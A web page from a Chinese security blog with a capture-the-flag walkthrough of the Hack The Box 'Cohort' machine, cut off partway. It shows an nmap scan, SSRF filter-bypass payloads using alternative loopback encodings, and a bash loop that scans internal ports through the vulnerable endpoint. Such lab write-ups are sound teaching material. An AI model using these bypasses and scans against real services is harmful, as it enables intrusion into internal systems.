@@ -1,0 +1,1361 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Cohort 靶机 IP：10.129.52.57 连通性测试： 1 2 3 4 5 6 7 8 9 10 11 ┌──(root㉿kali)-[~/HTB/Cohort] └─# ping -c 4">
+<title>20. Cohort</title>
+
+<link rel='canonical' href='https://Sp1ke-sec.github.io/p/20.-cohort/'>
+
+<link rel="stylesheet" href="/scss/style.min.3dc2b87862416cdfa498393fe10f71a7856c63450472efbab1e94150643be501.css"><meta property='og:title' content="20. Cohort">
+<meta property='og:description' content="Cohort 靶机 IP：10.129.52.57 连通性测试： 1 2 3 4 5 6 7 8 9 10 11 ┌──(root㉿kali)-[~/HTB/Cohort] └─# ping -c 4">
+<meta property='og:url' content='https://Sp1ke-sec.github.io/p/20.-cohort/'>
+<meta property='og:site_name' content='Sp1ke-sec 安全博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-11-15T16:57:10&#43;08:00'/><meta property='article:modified_time' content='2026-11-15T16:57:10&#43;08:00'/><meta property='og:image' content='https://Sp1ke-sec.github.io/p/20.-cohort/assets/image-20261115120600328.png' />
+<meta name="twitter:title" content="20. Cohort">
+<meta name="twitter:description" content="Cohort 靶机 IP：10.129.52.57 连通性测试： 1 2 3 4 5 6 7 8 9 10 11 ┌──(root㉿kali)-[~/HTB/Cohort] └─# ping -c 4"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://Sp1ke-sec.github.io/p/20.-cohort/assets/image-20261115120600328.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu1489495842607495246.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🚭</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Sp1ke-sec 安全博客</a></h1>
+            <h2 class="site-description">这里是 Sp1ke-sec</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sp1ke-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#信息收集">信息收集</a>
+      <ol>
+        <li><a href="#端口扫描">端口扫描</a></li>
+      </ol>
+    </li>
+    <li><a href="#立足点">立足点</a>
+      <ol>
+        <li><a href="#ssrf">SSRF</a></li>
+        <li><a href="#cve-2026-39987">CVE-2026-39987</a></li>
+      </ol>
+    </li>
+    <li><a href="#提权">提权</a>
+      <ol>
+        <li><a href="#linpeas-扫描">Linpeas 扫描</a></li>
+        <li><a href="#cve-2026-41651-pack2theroot">CVE-2026-41651 (Pack2TheRoot)</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/20.-cohort/">
+                <img src="/p/20.-cohort/assets/image-20261115120600328_hu8738877020847384230.png"
+                        srcset="/p/20.-cohort/assets/image-20261115120600328_hu8738877020847384230.png 800w, /p/20.-cohort/assets/image-20261115120600328_hu8387988487400209118.png 1600w"
+                        width="800" 
+                        height="394" 
+                        loading="lazy"
+                        alt="Featured image of post 20. Cohort" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" style="background-color: #2a9d8f; color: #fff;">
+                HTB
+            </a>
+        
+            <a href="/categories/easy/" >
+                Easy
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/20.-cohort/">20. Cohort</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-11-15</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="cohort">Cohort
+</h1><p><img src="/p/20.-cohort/assets/image-20261115120600328.png"
+	width="408"
+	height="201"
+	srcset="/p/20.-cohort/assets/image-20261115120600328_hu3408554053153267671.png 480w, /p/20.-cohort/assets/image-20261115120600328_hu14136831731618654064.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261115120600328"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="202"
+		data-flex-basis="487px"
+	
+></p>
+<p>靶机 IP：10.129.52.57</p>
+<p>连通性测试：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Cohort<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ping -c <span class="m">4</span> 10.129.52.57 
+</span></span><span class="line"><span class="cl">PING 10.129.52.57 <span class="o">(</span>10.129.52.57<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.52.57: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">111</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.52.57: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">113</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.52.57: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">3</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">115</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.52.57: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">4</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">122</span> ms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--- 10.129.52.57 ping statistics ---
+</span></span><span class="line"><span class="cl"><span class="m">4</span> packets transmitted, <span class="m">4</span> received, 0% packet loss, <span class="nb">time</span> 3011ms
+</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 111.031/115.214/121.591/3.958 ms
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解决该靶机时参考了：</p>
+<p><a class="link" href="https://lankylukeaus.github.io/machines/cohort.html"  target="_blank" rel="noopener"
+    >https://lankylukeaus.github.io/machines/cohort.html</a></p>
+<p><a class="link" href="https://medium.com/@osamahegazey605/cohort-hackthebox-983251376295"  target="_blank" rel="noopener"
+    >https://medium.com/@osamahegazey605/cohort-hackthebox-983251376295</a></p>
+<h2 id="信息收集">信息收集
+</h2><h3 id="端口扫描">端口扫描
+</h3><p>使用 Nmap 扫描靶机端口。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Cohort<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -T4 10.129.52.57              
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-15 04:07 +0000
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.52.57 <span class="o">(</span>10.129.52.57<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.12s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh
+</span></span><span class="line"><span class="cl">80/tcp  open  http
+</span></span><span class="line"><span class="cl">443/tcp open  https
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 2.07 seconds
+</span></span><span class="line"><span class="cl">      
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Cohort<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -sV -sC -p 22,80,443 10.129.52.57
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-15 04:07 +0000
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.52.57 <span class="o">(</span>10.129.52.57<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.12s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http     nginx 1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://cohort.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">443/tcp open  ssl/http nginx 1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://cohort.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   http/1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   http/1.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/0.9
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>cohort.htb/organizationName<span class="o">=</span>Cohort Analytics
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2026-06-01T18:47:07
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2126-05-08T18:47:07
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 20.39 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>SERVICE</th>
+<th>NOTES</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>ssh</td>
+<td>OpenSSH 9.6p1</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>nginx</td>
+</tr>
+<tr>
+<td>443</td>
+<td>https</td>
+<td>nginx</td>
+</tr>
+</tbody>
+</table></div>
+<h2 id="立足点">立足点
+</h2><p>访问 <code>10.129.52.57</code> 会被重定向到 <code>https://cohort.htb/</code> 。</p>
+<p>添加一条 hosts 静态解析规则。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Cohort<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">echo</span> <span class="s2">&#34;10.129.52.57 cohort.htb&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/20.-cohort/assets/image-20261115122120312.png"
+	width="2206"
+	height="1175"
+	srcset="/p/20.-cohort/assets/image-20261115122120312_hu6397200279356176841.png 480w, /p/20.-cohort/assets/image-20261115122120312_hu12645733222750412558.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261115122120312"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="187"
+		data-flex-basis="450px"
+	
+></p>
+<h3 id="ssrf">SSRF
+</h3><p>浏览这个站点，发现在 <code>/portal.html</code> 处存在一个客户门户，提供的功能是：验证数据源 URL并向其发起请求。</p>
+<p>对于接收 URL 并发起请求的功能点，我们都可以尝试 SSRF。</p>
+<p><img src="/p/20.-cohort/assets/image-20261115122539991.png"
+	width="1773"
+	height="1144"
+	srcset="/p/20.-cohort/assets/image-20261115122539991_hu2978376242830325475.png 480w, /p/20.-cohort/assets/image-20261115122539991_hu2721786358350905378.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261115122539991"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="154"
+		data-flex-basis="371px"
+	
+></p>
+<p>抓包可以发现，请求是通过 <code>/api/validate</code> 接口发送的。</p>
+<p><img src="/p/20.-cohort/assets/image-20261115122831753.png"
+	width="2111"
+	height="925"
+	srcset="/p/20.-cohort/assets/image-20261115122831753_hu14070662761232943407.png 480w, /p/20.-cohort/assets/image-20261115122831753_hu18006345792394477793.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261115122831753"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="228"
+		data-flex-basis="547px"
+	
+></p>
+<p>尽管旁边的的 <code>Notes</code> 声称 <code>For security, internal and loopback addresses are rejected.</code>，但是我们还有很多绕过方式。</p>
+<p>经过测试，被禁止的 URL 有：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -sk -X POST https://cohort.htb/api/validate -d <span class="s1">&#39;{&#34;url&#34;: &#34;http://127.0.0.1&#34;}&#39;</span>
+</span></span><span class="line"><span class="cl">curl -sk -X POST https://cohort.htb/api/validate -d <span class="s1">&#39;{&#34;url&#34;: &#34;http://localhost&#34;}&#39;</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但可以通过各种方式绕过：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -sk -X POST https://cohort.htb/api/validate -d <span class="s1">&#39;{&#34;url&#34;: &#34;http://127.1&#34;}&#39;</span> <span class="c1"># 短格式</span>
+</span></span><span class="line"><span class="cl">curl -sk -X POST https://cohort.htb/api/validate -d <span class="s1">&#39;{&#34;url&#34;: &#34;http://0177.0.0.1&#34;}&#39;</span> <span class="c1"># 八进制</span>
+</span></span><span class="line"><span class="cl">curl -sk -X POST https://cohort.htb/api/validate -d <span class="s1">&#39;{&#34;url&#34;: &#34;http://2130706433&#34;}&#39;</span> <span class="c1"># 十进制</span>
+</span></span><span class="line"><span class="cl">curl -sk -X POST https://cohort.htb/api/validate -d <span class="s1">&#39;{&#34;url&#34;: &#34;http://[::ffff:127.0.0.1]&#34;}&#39;</span> <span class="c1"># v4 映射 v6</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功绕过检测之后，我们可以通过 SSRF 对靶机开放的端口，包括内网端口进行探测。</p>
+<p>先探测一个不太可能开放的端口，了解未开放端口的回显。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Cohort<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -sk -X POST https://cohort.htb/api/validate -d <span class="s1">&#39;{&#34;url&#34;: &#34;http://127.1:90&#34;}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;ok&#34;</span>: false, <span class="s2">&#34;message&#34;</span>: <span class="s2">&#34;Could not reach the source: [Errno 111] Connection refused&#34;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>写一个 bash 脚本测试前一万个端口的开放情况。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> p in <span class="k">$(</span>seq <span class="m">1</span> 10000<span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">  curl -sk --max-time <span class="m">3</span> -X POST https://cohort.htb/api/validate <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    -d <span class="s2">&#34;{\&#34;url\&#34;:\&#34;http://127.1:</span><span class="nv">$p</span><span class="s2">/\&#34;}&#34;</span> <span class="p">|</span> grep -q <span class="s1">&#39;Connection refused&#39;</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">&#34;OPEN: </span><span class="nv">$p</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有几个细节需要注意。</p>
+<p><code>&quot;{\&quot;url\&quot;:\&quot;http://127.1:$p/\&quot;}&quot;</code> 外层使用双引号，如果用单引号，<code>$p</code> 将不会被解析。</p>
+<p><code>grep -q</code> 为安静模式，不输出匹配到的文字，只返回退出状态码，找到匹配内容为0，否则非0。</p>
+<p>上面的代码是串行的，也就是说探测完一个端口再去探测下一个，且由于 <code>--max-time</code> 超时设置为 3s，导致最坏的情况需要 30000s 才能扫完这一万个端口。</p>
+<p>使用 <code>xargs</code> 并发加快扫描速度。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
